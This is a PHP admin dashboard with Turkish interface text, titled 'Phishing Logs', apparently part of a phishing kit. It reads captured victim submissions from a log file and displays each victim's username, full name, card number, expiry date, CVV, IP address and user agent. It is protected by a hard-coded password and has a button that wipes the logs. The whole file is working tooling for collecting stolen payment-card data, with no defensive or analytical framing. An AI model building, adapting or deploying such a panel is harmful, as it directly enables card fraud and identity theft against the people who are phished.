<?php
// Basit şifre koruması
$password = 'admin123'; // Şifrenizi değiştirin

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] !== 'admin' || $_SERVER['PHP_AUTH_PW'] !== $password) {
    header('WWW-Authenticate: Basic realm="Admin Panel"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Giriş reddedildi';
    exit;
}

$log_file = 'logs.txt';
$logs = [];

if (file_exists($log_file)) {
    $content = file_get_contents($log_file);
    if (!empty($content)) {
        $logs = json_decode($content, true) ?? [];
    }
}

// Silme işlemi
if (isset($_GET['clear'])) {
    file_put_contents($log_file, '');
    header('Location: admin.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Phishing Logs</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f1419;
            color: #e7e9ea;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #2f3336;
        }

        .header h1 {
            font-size: 24px;
            color: #1d9bf0;
        }

        .header .stats {
            display: flex;
            gap: 20px;
            align-items: center;
        }

        .stat-box {
            background: #1d293b;
            padding: 10px 20px;
            border-radius: 10px;
            text-align: center;
        }

        .stat-box .number {
            font-size: 24px;
            font-weight: 700;
            color: #1d9bf0;
        }

        .stat-box .label {
            font-size: 12px;
            color: #71767b;
        }

        .actions {
            display: flex;
            gap: 10px;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: opacity 0.2s;
        }

        .btn:hover {
            opacity: 0.8;
        }

        .btn-danger {
            background: #e0245e;
            color: white;
        }

        .btn-refresh {
            background: #1d9bf0;
            color: white;
        }

        .card {
            background: #1d293b;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #2f3336;
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #2f3336;
        }

        .card-header .user-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .card-header .badge {
            background: #e0245e;
            color: white;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }

        .card-header .time {
            color: #71767b;
            font-size: 13px;
        }

        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }

        .data-item {
            background: #0f1419;
            padding: 12px 15px;
            border-radius: 10px;
        }

        .data-item .label {
            font-size: 11px;
            color: #71767b;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 5px;
        }

        .data-item .value {
            font-size: 15px;
            color: #e7e9ea;
            word-break: break-all;
        }

        .data-item .value.card-number {
            font-family: monospace;
            font-size: 18px;
            letter-spacing: 2px;
            color: #1d9bf0;
        }

        .data-item .value.sensitive {
            color: #e0245e;
            font-weight: 600;
        }

        .ip-info {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #2f3336;
        }

        .ip-info .ip-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #71767b;
        }

        .empty-state h2 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #e7e9ea;
        }

        .card-number-reveal {
            background: #0f1419;
            padding: 15px;
            border-radius: 10px;
            margin-top: 10px;
            font-family: monospace;
            font-size: 22px;
            letter-spacing: 3px;
            color: #1d9bf0;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Admin Panel</h1>
            <div class="stats">
                <div class="stat-box">
                    <div class="number"><?php echo count($logs); ?></div>
                    <div class="label">Toplam Kayıt</div>
                </div>
                <div class="actions">
                    <a href="admin.php" class="btn btn-refresh">🔄 Yenile</a>
                    <a href="admin.php?clear=1" class="btn btn-danger" onclick="return confirm('Tüm kayıtlar silinsin mi?')">🗑️ Temizle</a>
                </div>
            </div>
        </div>

        <?php if (empty($logs)): ?>
            <div class="empty-state">
                <h2>Henüz kayıt yok</h2>
                <p>Hiçbir kullanıcı formu doldurmadı.</p>
            </div>
        <?php else: ?>
            <?php $logs = array_reverse($logs); ?>
            <?php foreach ($logs as $index => $log): ?>
                <div class="card">
                    <div class="card-header">
                        <div class="user-info">
                            <span class="badge">#<?php echo count($logs) - $index; ?></span>
                            <strong><?php echo htmlspecialchars($log['username'] ?? 'Belirtilmemiş'); ?></strong>
                        </div>
                        <span class="time"><?php echo htmlspecialchars($log['timestamp'] ?? 'Tarih yok'); ?></span>
                    </div>

                    <div class="data-grid">
                        <?php if (isset($log['username'])): ?>
                        <div class="data-item">
                            <div class="label">Kullanıcı Adı</div>
                            <div class="value">@<?php echo htmlspecialchars($log['username']); ?></div>
                        </div>
                        <?php endif; ?>

                        <?php if (isset($log['fullname'])): ?>
                        <div class="data-item">
                            <div class="label">Ad Soyad</div>
                            <div class="value"><?php echo htmlspecialchars($log['fullname']); ?></div>
                        </div>
                        <?php endif; ?>

                        <?php if (isset($log['cardnumber'])): ?>
                        <div class="data-item" style="grid-column: 1 / -1;">
                            <div class="label">Kart Numarası</div>
                            <div class="card-number-reveal"><?php echo htmlspecialchars($log['cardnumber']); ?></div>
                        </div>
                        <?php endif; ?>

                        <?php if (isset($log['expiry'])): ?>
                        <div class="data-item">
                            <div class="label">Son Kullanma</div>
                            <div class="value sensitive"><?php echo htmlspecialchars($log['expiry']); ?></div>
                        </div>
                        <?php endif; ?>

                        <?php if (isset($log['cvv'])): ?>
                        <div class="data-item">
                            <div class="label">CVV</div>
                            <div class="value sensitive"><?php echo htmlspecialchars($log['cvv']); ?></div>
                        </div>
                        <?php endif; ?>
                    </div>

                    <div class="ip-info">
                        <div class="ip-grid">
                            <div class="data-item">
                                <div class="label">IP Adresi</div>
                                <div class="value"><?php echo htmlspecialchars($log['ip'] ?? 'Bilinmiyor'); ?></div>
                            </div>
                            <div class="data-item">
                                <div class="label">User Agent</div>
                                <div class="value" style="font-size: 12px;"><?php echo htmlspecialchars($log['user_agent'] ?? 'Bilinmiyor'); ?></div>
                            </div>
                        </div>
                    </div>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
</body>
</html>
